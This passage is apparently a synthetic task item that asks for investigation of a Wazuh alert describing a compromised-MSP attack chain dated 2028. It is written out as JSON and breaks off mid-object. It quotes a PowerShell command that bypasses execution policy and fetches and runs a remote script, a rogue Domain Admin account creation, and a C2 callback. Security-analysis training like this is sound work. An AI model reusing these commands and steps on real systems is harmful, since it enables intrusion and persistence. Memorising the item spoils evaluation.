Investigate this Wazuh alert:

{
  "severity": "critical",
  "network_observations": [
    {"ip": "10.30.7.99", "inferred_role": "msp_rmm_agent_corporate_endpoint", "first_seen": "2028-04-19T22:18:42+0200", "last_seen": "2028-04-19T22:38:42+0200", "agent_name": "MSP-RMM-AGENT"},
    {"ip": "10.30.2.10", "inferred_role": "corp_domain_controller", "first_seen": "2028-04-19T22:28:42+0200", "last_seen": "2028-04-19T22:32:18+0200", "agent_name": "DC-CORP-01"},
    {"ip": "185.220.101.42", "inferred_role": "external_attacker_c2", "first_seen": "2028-04-19T22:38:42+0200", "last_seen": "2028-04-19T22:38:42+0200"}
  ],
  "external_domains": [
    {"domain": "corpitsupport-msp.cloud", "inferred_role": "compromised_msp_vendor_domain_recent_ti_change", "first_seen": "2028-04-19T22:22:18+0200", "last_seen": "2028-04-19T22:24:18+0200"}
  ],
  "attack_progression": [
    {"step": 1, "tactic": "Trusted Relationship (Vendor Baseline)", "technique": "T1199", "what_happened": "At 2028-04-19 22:18:42 CEST, Sysmon Event 1 on MSP-RMM-AGENT.corp.local (10.30.7.99) recorded screenconnect.exe (Kaseya/ConnectWise-class RMM binary) launching with parentImage=services.exe, user=NT AUTHORITY\\SYSTEM. This is the BASELINE state — the MSP's RMM agent runs as a Windows service under SYSTEM. CorpITSupport-MSP is the managed service provider for corp.local with contractually-granted Domain Admin-equivalent permissions via the svc-msp-admin service account, used through the RMM tooling for patch management, software deployment, and remote troubleshooting. This first Sysmon Event 1 by itself is normal and would not trigger an alert in isolation; it only matters as the parent context of the abnormal child process at 22:22:18.", "chain_reason": "Sysmon Event 1: image=screenconnect.exe, parentImage=services.exe, user=NT AUTHORITY\\SYSTEM. Service-managed boot of an authorized RMM agent. The alert chain begins HERE only because the subsequent step uses this process as its parent — the screenconnect.exe lineage becomes the abuse vector.", "first_seen": "2028-04-19T22:18:42+0200"},
    {"step": 2, "tactic": "Initial Access via Trusted Vendor / Command and Scripting Interpreter", "technique": "T1199 + T1059.001", "what_happened": "At 22:22:18, Sysmon Event 1 on MSP-RMM-AGENT recorded screenconnect.exe spawning powershell.exe with commandLine='powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest http://corpitsupport-msp.cloud/deploy/agent_v3.ps1 -OutFile temp.ps1'. This is an ABNORMAL RMM behavior — RMM agents push pre-defined scripts from MSP-controlled artifact stores via authenticated agent-to-server protocols, they do NOT issue ad-hoc Invoke-WebRequest commands to pull arbitrary scripts. The destination 'corpitsupport-msp.cloud' IS the MSP's legitimate domain (historically benign), but a 2028-04-19 external threat-intel feed update flagged the domain as recently compromised — registrar lookups show DNS records changed 2028-04-17, MX records repointed to attacker-owned infrastructure, and several MSP customers reporting anomalous RMM behavior in the past 48 hours.", "chain_reason": "Sysmon Event 1: parentImage=screenconnect.exe + image=powershell.exe + commandLine contains 'Invoke-WebRequest' + 'corpitsupport-msp.cloud' + '-ExecutionPolicy Bypass'. The parent-child lineage RMM→PowerShell→Invoke-WebRequest with external HTTP fetch is the abuse-pattern signature for a compromised-MSP supply chain attack (MITRE T1199 Trusted Relationship abuse).", "first_seen": "2028-04-19T22:22:18+0200"},
    {"step": 3, "tactic": "Vendor Reputation Alert", "technique": "T1199", "what_happened": "At 22:22:42, Wazuh decoder fired a custom correlation rule: 'MSP-RMM-AGENT executing remote PowerShell payload from MSP vendor domain — vendor domain reputation degraded (TI feed update 2028-04-19, indicators: recent DNS changes, MX repoint, multi-customer anomaly reports)'. The rule fires because the source host is tagged 'rmm_agent_endpoint' in CMDB AND the destination domain is tagged 'recently_changed_reputation' in the threat-intel knowledge base. Importantly: under the OLD reputation status (pre-2028-04-19), this exact behavior would have generated a LOW-severity 'unusual RMM script pull' alert at most, because corpitsupport-msp.cloud was the legitimate MSP domain. The current CRITICAL severity is driven entirely by the reputation change — meaning the SOC must treat the MSP's tooling itself as the compromised channel, not as a trusted control plane.", "chain_reason": "Wazuh rule.description references both data.win.eventdata.commandLine + data.win.eventdata.parentImage from step 2 plus the asynchronous TI-feed reputation update. Multi-feed correlation: endpoint-process telemetry + external-TI domain-reputation knowledge.", "first_seen": "2028-04-19T22:22:42+0200"},
    {"step": 4, "tactic": "Execution / Command and Scripting Interpreter", "technique": "T1059.001", "what_happened": "At 22:24:18, Sysmon Event 1 on MSP-RMM-AGENT recorded powershell.exe spawning with commandLine='powershell.exe -File C:\\Windows\\Temp\\temp.ps1', parentImage=screenconnect.exe, user=NT AUTHORITY\\SYSTEM. The script pulled in step 2 is being executed. The script content (extracted via parallel EDR file-write telemetry on C:\\Windows\\Temp\\temp.ps1) contains domain administrative operations — net.exe user create, net.exe group add, dsadd user, Add-ADGroupMember — all leveraging the RMM agent's stored svc-msp-admin credentials (a Domain Admin-equivalent account that the legitimate MSP workflow uses for AD operations across customer tenants).", "chain_reason": "Sysmon Event 1: image=powershell.exe + commandLine='powershell.exe -File C:\\Windows\\Temp\\temp.ps1' + parentImage=screenconnect.exe + user=NT AUTHORITY\\SYSTEM. Continuity from step 2 — the downloaded script is executed by the same RMM-process lineage. The attacker is leveraging the RMM agent's privileged credential cache for Active Directory operations.", "first_seen": "2028-04-19T22:24:18+0200"},
    {"step": 5, "tactic": "Initial Access / Valid Accounts (Lateral via MSP Credentials)", "technique": "T1078 + T1078.002", "what_happened": "At 22:28:42, Windows Security Event 4624 on DC-CORP-01 (10.30.2.10): logonType=3 (Network), TargetUserName=svc-msp-admin, IpAddress=10.30.7.99 (the RMM agent host). svc-msp-admin is the MSP's privileged service account holding Domain Admin-equivalent permissions for corp.local AD operations. The 4624 from MSP-RMM-AGENT to DC-CORP-01 is technically expected during MSP-driven AD operations, BUT the timing (immediately following the abnormal Invoke-WebRequest + script execution in steps 2 and 4, and the new TI-flagged reputation in step 3) reframes this 4624 as the moment the attacker pivoted from foothold-on-RMM-endpoint to direct-AD-operations using stolen MSP credentials.", "chain_reason": "Windows Security Event 4624: TargetUserName=svc-msp-admin + logonType=3 + IpAddress=10.30.7.99 + agent.name=DC-CORP-01. Network logon from the compromised RMM agent to the domain controller using MSP-tier credentials — Domain Admin-equivalent AD access.", "first_seen": "2028-04-19T22:28:42+0200"},
    {"step": 6, "tactic": "Persistence / Account Manipulation", "technique": "T1136.002 + T1098", "what_happened": "At 22:32:14, Windows Security Event 4720 on DC-CORP-01: a new user account 'it.backup4' was CREATED with SubjectUserName=svc-msp-admin (the MSP service account performing the creation). The account name 'it.backup4' is deliberately innocuous-sounding (mimics legitimate IT backup operator naming) and would blend into a normal MSP-managed AD environment audit. This is followed 4 seconds later at 22:32:18 by Windows Security Event 4732 'A member was added to a security-enabled local group': TargetUserName=it.backup4, GroupName=Domain Admins, SubjectUserName=svc-msp-admin. The newly-created account is now Domain Admin — persistence beyond the lifetime of the svc-msp-admin compromise (even if the MSP rotates svc-msp-admin's credentials, it.backup4 remains).", "chain_reason": "Windows Security Event 4720 (rogue user creation) + Event 4732 (Domain Admins membership grant), both with SubjectUserName=svc-msp-admin. The two-step user-create-then-elevate sequence within 4 seconds is automation-level fast, consistent with the temp.ps1 script content observed in step 4. Persistence pattern: attacker-controlled Domain Admin account independent of the compromised MSP service account.", "first_seen": "2028-04-19T22:32:14+0200"},
    {"step": 7, "tactic": "Command and Control", "technique": "T1071.001 + T1071", "what_happened": "At 22:38:42, Sysmon Event 3 on MSP-RMM-AGENT recorded an outbound TCP connection to 185.220.101.42:443. The destination IP is NOT part of CorpITSupport-MSP's published legitimate control plane (the MSP's documented C2 IP ranges are in 91.234.x.x and 188.114.x.x per the MSP's published technical documentation). 185.220.101.42 has no relationship to MSP infrastructure and is an external attacker-controlled C2 endpoint. The 6-minute gap between AD persistence (22:32:18) and this C2 callback (22:38:42) is consistent with attacker tooling completing on-host AD-tampering tasks then phoning home to report progress and await next-stage instructions.", "chain_reason": "Sysmon Event 3: SourceIp=10.30.7.99 + DestinationIp=185.220.101.42 + DestinationPort=443. Outbound from RMM agent to a non-MSP IP = OUT-OF-BASELINE for an RMM agent that should only communicate with documented MSP infrastructure. The destination is a known external attacker C2 endpoint.", "first_seen": "2028-04-19T22:38:42+0200"}
  ],
  "time_window": {"start": "2028-04-19T22:18:42+0200", "end": "2028-04-19T22:38:42+0200"},
